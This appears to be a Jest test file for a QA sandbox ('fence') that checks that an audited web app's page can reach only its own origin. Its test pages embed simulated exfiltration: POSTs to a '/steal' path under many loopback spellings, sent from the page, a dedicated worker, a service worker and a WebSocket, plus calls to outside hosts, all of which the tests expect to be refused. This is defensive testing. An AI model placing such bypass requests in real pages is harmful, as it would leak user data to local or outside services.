/**
 * THE FENCE LETS A CHANGE RUN'S WALK REACH ONLY THE WALKED ORIGIN (design v13.3 §4, §12.2; agent H).
 *
 * Real walks of `auditBuiltApp` on a delivered folder (path 1, Joe's static preview), with the page itself trying to reach
 * everything around it: another port of this machine under every spelling of loopback (and the machine's name and LAN
 * address), from the page, from a dedicated worker, from a service worker and over a WebSocket; an outside https host;
 * and Chromium's own hosts. «Another address» is a real server listening on every interface: whatever reached it is in
 * its log. The page's own requests to its own origin are served.
 */
import fs from 'fs';
import os from 'os';
import path from 'path';
import { qaPathLines } from '../core/engine/verify';
import { BROWSER_OWN } from '../core/quality/qa-fence';
import { nonGet, serve, type Served } from './fixtures/live-app/live-app';

jest.setTimeout(600_000);

const tmp = fs.mkdtempSync(path.join(process.env.JOE_TEST_TMP_ROOT || os.tmpdir(), 'joe-fence-h-'));
let other: Served;
let app: Served;
let pageHtml = '';
const SW = (otherPort: number) => `self.addEventListener('install', function (e) { self.skipWaiting(); });
self.addEventListener('activate', function (e) {
  e.waitUntil(fetch('http://127.0.0.1:${otherPort}/service-worker', { method: 'POST', body: 'sw' }).catch(function () {}));
});`;

beforeAll(async () => {
    //  Every interface, both stacks: a request that got through under any spelling lands here.
    other = await serve((_q, res) => { res.writeHead(200, { 'access-control-allow-origin': '*', 'content-type': 'text/plain' }); res.end('ok'); }, '::');
    app = await serve((req, res) => {
        if (req.method === 'GET' && req.url === '/sw.js') { res.writeHead(200, { 'content-type': 'text/javascript' }); return res.end(SW(other.port)); }
        if (req.method === 'GET' && (req.url === '/' || req.url === '/index.html')) { res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' }); return res.end(pageHtml); }
        res.writeHead(200, { 'content-type': 'text/plain' }); res.end('ok');
    });
});
afterAll(async () => {
    await other?.close();
    await app?.close();
    jest.restoreAllMocks();
    fs.rmSync(tmp, { recursive: true, force: true, maxRetries: 10, retryDelay: 200 });
});
beforeEach(() => { other.hits.length = 0; app.hits.length = 0; });

function delivered(name: string): string {
    const root = fs.mkdtempSync(path.join(tmp, `${name}-`));
    fs.mkdirSync(path.join(root, 'dist'), { recursive: true });
    fs.writeFileSync(path.join(root, 'dist', 'index.html'), '<!doctype html><title>x</title>');
    fs.mkdirSync(path.join(root, '.joe'), { recursive: true });
    fs.writeFileSync(path.join(root, '.joe', 'delivered'), '');
    return root;
}

/** The fence the walk started, caught as it is closed (its refusals read before the worker goes). */
function catchFence(): { refusals: string[]; appRefusals: string[]; restore(): void } {
    const fenceModule = require('../core/quality/qa-fence');
    const real = fenceModule.startQaFence;
    const caught = { refusals: [] as string[], appRefusals: [] as string[], restore: () => spy.mockRestore() };
    const spy = jest.spyOn(fenceModule, 'startQaFence').mockImplementation(async (...args: unknown[]) => {
        const f = await real(args[0]);
        const close = f.close.bind(f);
        f.close = async () => {
            try { caught.refusals.push(...f.refusals().map((r: any) => r.what)); caught.appRefusals.push(...f.appRefusals().map((r: any) => r.what)); } catch { /* none */ }
            return close();
        };
        return f;
    });
    return caught;
}

const lan = (): string => {
    for (const list of Object.values(os.networkInterfaces())) for (const i of list || []) if (i.family === 'IPv4' && !i.internal) return i.address;
    return '';
};

const WALK = { timeoutMs: 25_000, walkMs: 14_000 };

describe('12.2 rows 1–3 — every other address of this machine is refused; the page\'s own origin is served', () => {
    it('loopback spellings, the machine name and LAN address, a worker, a service worker and a WebSocket reach nothing; /own is served', async () => {
        const P = other.port;
        const spellings = ['127.0.0.1', 'localhost', '[::1]', '127.0.0.2', '[::ffff:127.0.0.1]', os.hostname().toLowerCase(), lan(), '0x7f000001', 'localhost.', '127.1'].filter(Boolean);
        pageHtml = `<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Orders</title></head>
<body><main><h1>Orders</h1><p>Your orders.</p>
<script>
  var spellings = ${JSON.stringify(spellings)};
  spellings.forEach(function (h) { fetch('http://' + h + ':${P}/steal?h=' + encodeURIComponent(h), { method: 'POST', body: 'x', mode: 'no-cors' }).catch(function () {}); });
  //  the walked port itself under another spelling of its host
  fetch('http://localhost:${app.port}/spelling', { method: 'POST', body: 'x', mode: 'no-cors' }).catch(function () {});
  fetch('/own', { method: 'POST', body: 'mine' }).catch(function () {});
  try { new Worker(URL.createObjectURL(new Blob(["fetch('http://127.0.0.1:${P}/worker', { method: 'POST', body: 'w', mode: 'no-cors' }).catch(function () {});"], { type: 'text/javascript' }))); } catch (e) {}
  try { if (navigator.serviceWorker) navigator.serviceWorker.register('/sw.js').catch(function () {}); } catch (e) {}
  try { var ws = new WebSocket('ws://127.0.0.1:${P}/ws'); ws.onerror = function () {}; } catch (e) {}
</script></main></body></html>`;
        const root = delivered('spellings');
        const caught = catchFence();
        try {
            const { auditBuiltApp } = require('../core/quality/app-audit');
            const a = await auditBuiltApp(path.join(root, 'dist'), { ...WALK, serveUrl: app.url, projectRoot: root, startKind: 'static' });
            expect(a.skipped).toBeUndefined();
            expect(a.qaPath?.path).toBe('private-live');
            //  Nothing reached the other address, under any spelling, from any part of the page.
            expect(other.hits).toEqual([]);
            //  The walked port under another spelling is another origin: refused too.
            expect(app.hits.filter(h => h.url === '/spelling')).toEqual([]);
            //  Row 3: the page's own POST to its own origin is served.
            expect(app.hits.some(h => h.method === 'POST' && h.url === '/own' && h.body === 'mine')).toBe(true);
            //  The service worker was really registered from the walked origin (so its POST had its chance).
            expect(app.hits.some(h => h.method === 'GET' && h.url === '/sw.js')).toBe(true);
            //  Refused and told: the page's attempts are counted, the worker's and the WebSocket's among them.
            const refused = caught.appRefusals.join('\n');
            expect(refused).toMatch(new RegExp(`POST 127\\.0\\.0\\.1:${P}/steal`));
            expect(refused).toMatch(new RegExp(`POST 127\\.0\\.0\\.1:${P}/worker`));
            expect(refused).toMatch(new RegExp(`(?:CONNECT|GET) 127\\.0\\.0\\.1:${P}(?:/ws)?`));
            expect(refused).toMatch(new RegExp(`localhost:${app.port}/spelling`));
            expect(a.qaPath!.blocked).toBeGreaterThanOrEqual(spellings.length);
            //  Never charged.
            const ids = a.findings.map((f: any) => f.id);
            expect(ids).not.toContain('console_errors');
            expect(ids).not.toContain('failed_requests');
        } finally { caught.restore(); }
    });
});

describe('12.2 rows 4–5 — an outside host and Chromium\'s own', () => {
    it('https://api.example.test is a refused CONNECT, told as blocked with its host, never charged; Chromium\'s own hosts are refused and not told', async () => {
        pageHtml = `<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Shop</title></head>
<body><main><h1>Shop</h1><p>Welcome.</p>
<script>
  fetch('https://api.example.test/v1/orders', { method: 'POST', body: '{}' }).catch(function (e) { console.error('the order service is down: ' + e); });
  fetch('https://update.googleapis.com/service/update2').catch(function () {});
</script></main></body></html>`;
        const root = delivered('outside');
        const caught = catchFence();
        try {
            const { auditBuiltApp } = require('../core/quality/app-audit');
            const a = await auditBuiltApp(path.join(root, 'dist'), { ...WALK, serveUrl: app.url, projectRoot: root, startKind: 'static' });
            expect(a.skipped).toBeUndefined();
            expect(a.qaPath?.path).toBe('private-live');
            expect(caught.refusals.some(w => /^CONNECT api\.example\.test:443/.test(w))).toBe(true);
            expect(a.qaPath!.blockedHosts).toEqual(['api.example.test']);
            const n = a.qaPath!.blocked;
            expect(n).toBeGreaterThanOrEqual(1);
            //  Row 5: Chromium's (and Google's update) hosts are refused like everything else, and never told.
            const own = caught.refusals.filter(w => BROWSER_OWN.test(` ${w}`));
            expect(own.some(w => /update\.googleapis\.com/.test(w))).toBe(true);
            expect(caught.appRefusals.filter(w => BROWSER_OWN.test(` ${w}`))).toEqual([]);
            expect(a.qaPath!.blockedHosts.some((h: string) => /google/.test(h))).toBe(false);
            //  The console error the refusal caused is not charged.
            const ids = a.findings.map((f: any) => f.id);
            expect(ids).not.toContain('console_errors');
            expect(ids).not.toContain('failed_requests');
            //  Told, in the owner's words; and the «only your app's address» line is NOT said.
            const lines = qaPathLines({ path: 'private-live', blocked: n, blockedHosts: a.qaPath!.blockedHosts, notTried: [], skippedProbes: [], walked: true, origin: new URL(app.url).origin } as any, 'en');
            expect(lines).toEqual([`During the checks your app's page tried ${n} times to reach other addresses (api.example.test); Joe's checks stopped those requests, so what depends on them was not tried.`]);
            expect(lines.join(' ')).not.toContain('reached only your app');
            expect(other.hits).toEqual([]);
        } finally { caught.restore(); }
    });
});

describe('12.2 row 6 — the audit\'s own server on a change run', () => {
    it('/api/joe-external/* answers a write with 403', async () => {
        const root = delivered('own');
        fs.writeFileSync(path.join(root, 'dist', 'index.html'), `<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Weather</title></head><body><main><h1>Weather</h1>
<script>
  fetch('/api/joe-external/weather', { method: 'POST', body: '{"city":"Riyadh"}' })
    .then(function (r) { var i = new Image(); i.src = '/answered-' + r.status + '.png'; document.body.appendChild(i); })
    .catch(function () {});
</script></main></body></html>`);
        const { auditBuiltApp } = require('../core/quality/app-audit');
        const a = await auditBuiltApp(path.join(root, 'dist'), { ...WALK, projectRoot: root });
        expect(a.qaPath?.path).toBe('private-live');
        //  The page's own server answered the write with 403 (the image the page asked for names the status it got).
        expect(JSON.stringify(a.findings)).toContain('answered-403.png');
        expect(JSON.stringify(a.findings)).not.toMatch(/answered-(?:200|201|5\d\d)\.png/);
        expect(nonGet(other.hits)).toEqual([]);
    });
});
